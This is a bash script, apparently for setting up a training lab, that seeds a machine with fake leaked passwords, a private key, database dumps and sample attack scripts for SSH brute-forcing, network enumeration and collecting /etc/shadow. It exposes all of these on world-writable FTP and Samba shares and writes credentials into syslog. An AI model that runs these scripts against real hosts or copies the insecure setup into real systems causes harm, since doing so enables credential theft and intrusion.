#!/bin/bash

echo "=== Configurando arquivos sensíveis e dumps ==="

# Criar diretórios para arquivos vulneráveis
mkdir -p /opt/vulnerable_files/dumps
mkdir -p /opt/vulnerable_files/scripts
mkdir -p /opt/vulnerable_files/backups
mkdir -p /var/ftp/pub/uploads
mkdir -p /var/samba/public/dumps

# 1. Criar dumps de arquivos sensíveis
echo "Criando dumps de arquivos sensíveis..."

# Dump de senhas (simulado)
cat > /opt/vulnerable_files/dumps/passwords.txt << EOF
# Arquivo de senhas vazado (SIMULAÇÃO)
admin:admin123
root:toor
user1:password123
user2:qwerty
ftpuser:ftp123
smbuser:smb123
webadmin:web123
database:db123
EOF

# Dump de configurações de banco de dados
cat > /opt/vulnerable_files/dumps/database_config.txt << EOF
# Configuração de banco de dados (SIMULAÇÃO)
DB_HOST=192.168.1.100
DB_PORT=3306
DB_NAME=production_db
DB_USER=admin
DB_PASS=super_secret_password_123
DB_ROOT_PASS=root_password_456
EOF

# Dump de chaves SSH
cat > /opt/vulnerable_files/dumps/ssh_keys.txt << EOF
# Chaves SSH vazadas (SIMULAÇÃO)
-----BEGIN RSA PRIVATE KEY-----
MIIBOgIBAAJBAKj34GkxFhD90vcNLYLInFEX6Ppy1tPf9Cnzj4p4WGeKLs1Pt8Qu
KUpRKfFLfRYC9AIKjJdfFbKWMNZ2yQIDAQABAkAfoiLyL+Z4lf4Myxk6xUDgLaWG
NTLnRlkmoASdSJ9SopO/2gwzovQPj3nb6u+OX3F0noTD7Mn+Ly+mREJgnVdRAiEA
6bIB0vOh1yw2vK4/oTjqDCqyqN8gLNSCwWI35vXeEKUCIQDJLQ5u2jkkUgxaX9aG
mAqgFj6s4w8X0J8fLqJzZdHLzQIgf0DkJI0m5C4Tfz5t6zrOVxJ0dRtdSD1vunjS
aRZMTqECIQCHhsoq90mWM/p9L5cQzLDW9T5zN4D5jDvh9xx2MyikUQIgSmmCk+ex
H+2U+068p9q4S8ZqGqjKLP1b264P5gTENw=
-----END RSA PRIVATE KEY-----
EOF

# Dump de logs de acesso
cat > /opt/vulnerable_files/dumps/access_logs.txt << EOF
# Logs de acesso vazados (SIMULAÇÃO)
192.168.1.50 - - [15/Jan/2024:10:30:15 +0000] "GET /admin/login.php HTTP/1.1" 200 1234
192.168.1.50 - - [15/Jan/2024:10:30:20 +0000] "POST /admin/login.php HTTP/1.1" 302 567
192.168.1.50 - - [15/Jan/2024:10:30:25 +0000] "GET /admin/dashboard.php HTTP/1.1" 200 2345
192.168.1.51 - - [15/Jan/2024:10:35:10 +0000] "GET /api/users HTTP/1.1" 401 890
192.168.1.52 - - [15/Jan/2024:10:40:30 +0000] "GET /backup/database.sql HTTP/1.1" 200 12345
EOF

# 2. Criar scripts maliciosos (para simular uploads)
echo "Criando scripts de exemplo..."

# Script de enumeração
cat > /opt/vulnerable_files/scripts/enum_script.sh << EOF
#!/bin/bash
# Script de enumeração (SIMULAÇÃO)
echo "Enumerando sistema..."
nmap -sS -sV -O 192.168.1.0/24
enum4linux -a 192.168.1.100
nmap --script smb-enum-shares 192.168.1.100
EOF

# Script de brute force
cat > /opt/vulnerable_files/scripts/brute_force.py << EOF
#!/usr/bin/env python3
# Script de brute force (SIMULAÇÃO)
import paramiko
import sys

def ssh_brute_force(host, username, wordlist):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    with open(wordlist, 'r') as f:
        passwords = f.read().splitlines()
    
    for password in passwords:
        try:
            ssh.connect(host, username=username, password=password, timeout=5)
            print(f"[+] Senha encontrada: {password}")
            ssh.close()
            return password
        except:
            continue
    
    print("[-] Senha não encontrada")
    return None

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Uso: python3 brute_force.py <host> <username> <wordlist>")
        sys.exit(1)
    
    ssh_brute_force(sys.argv[1], sys.argv[2], sys.argv[3])
EOF

# Script de exfiltração
cat > /opt/vulnerable_files/scripts/exfiltrate.sh << EOF
#!/bin/bash
# Script de exfiltração (SIMULAÇÃO)
echo "Exfiltrando dados..."

# Coletar informações do sistema
uname -a > /tmp/system_info.txt
cat /etc/passwd > /tmp/passwd.txt
cat /etc/shadow > /tmp/shadow.txt
ps aux > /tmp/processes.txt
netstat -tuln > /tmp/network.txt

# Compactar e enviar
tar -czf /tmp/exfil_data.tar.gz /tmp/*.txt
echo "Dados coletados em /tmp/exfil_data.tar.gz"
EOF

# 3. Criar backups sensíveis
echo "Criando backups sensíveis..."

# Backup de configuração
cat > /opt/vulnerable_files/backups/config_backup.tar.gz << EOF
# Arquivo de backup simulado (binário)
# Este é apenas um placeholder - em produção seria um arquivo real
EOF

# Backup de banco de dados
cat > /opt/vulnerable_files/backups/database_backup.sql << EOF
-- Backup de banco de dados (SIMULAÇÃO)
-- Contém dados sensíveis de usuários

CREATE TABLE users (
    id INT PRIMARY KEY,
    username VARCHAR(50),
    password VARCHAR(255),
    email VARCHAR(100),
    created_at TIMESTAMP
);

INSERT INTO users VALUES (1, 'admin', 'hash_admin123', 'admin@company.com', '2024-01-01');
INSERT INTO users VALUES (2, 'user1', 'hash_user123', 'user1@company.com', '2024-01-02');
INSERT INTO users VALUES (3, 'user2', 'hash_user456', 'user2@company.com', '2024-01-03');

CREATE TABLE sensitive_data (
    id INT PRIMARY KEY,
    data_type VARCHAR(50),
    content TEXT,
    access_level VARCHAR(20)
);

INSERT INTO sensitive_data VALUES (1, 'credit_card', '4111-1111-1111-1111', 'admin');
INSERT INTO sensitive_data VALUES (2, 'ssn', '123-45-6789', 'admin');
INSERT INTO sensitive_data VALUES (3, 'api_key', 'sk_live_1234567890abcdef', 'admin');
EOF

# 4. Copiar arquivos para locais acessíveis
echo "Distribuindo arquivos..."

# Copiar para FTP anônimo
cp /opt/vulnerable_files/dumps/* /var/ftp/pub/
cp /opt/vulnerable_files/scripts/* /var/ftp/pub/uploads/

# Copiar para Samba público
cp /opt/vulnerable_files/dumps/* /var/samba/public/dumps/
cp /opt/vulnerable_files/backups/* /var/samba/public/

# 5. Configurar permissões
chmod 755 /opt/vulnerable_files/scripts/*.sh
chmod 755 /opt/vulnerable_files/scripts/*.py
chmod 644 /opt/vulnerable_files/dumps/*
chmod 644 /opt/vulnerable_files/backups/*
chmod 777 /var/ftp/pub/*
chmod 777 /var/samba/public/dumps/*
chmod 777 /var/samba/public/*.sql

# 6. Criar arquivo de credenciais vazadas no syslog
echo "Configurando vazamento de credenciais no syslog..."

# Adicionar entradas no syslog para simular vazamento
logger -p auth.info "SSH login successful for user admin with password admin123"
logger -p auth.info "FTP login successful for user anonymous with password anonymous"
logger -p auth.info "SMB login successful for user smbuser with password password123"
logger -p auth.debug "Database connection: user=admin, password=super_secret_password_123"
logger -p auth.debug "API key accessed: sk_live_1234567890abcdef"

echo "=== Arquivos sensíveis configurados com sucesso ===" 